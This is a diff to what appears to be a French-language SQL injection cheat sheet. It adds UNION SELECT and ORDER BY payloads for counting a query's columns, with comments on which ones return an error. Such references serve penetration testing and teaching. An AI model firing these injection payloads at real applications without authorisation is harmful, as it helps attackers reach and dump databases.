@@ -2,9 +2,19 @@
 
 ## Déterminer le nombre de colonnes
 
+#### UNION
+
 ```
 ' union select 1-- -  # erreur
 ' union select 1, null-- - # pas d'erreur, il y a donc deux colonnes
+```
+
+#### ORDER BY
+
+```
+' order by 1-- - # pas d'erreur
+' order by 2-- - # pas d'erreur
+' order by 3-- - # Erreur, il y a donc deux colonnes
 ```
 
 ## Retrouver la version de la base de données
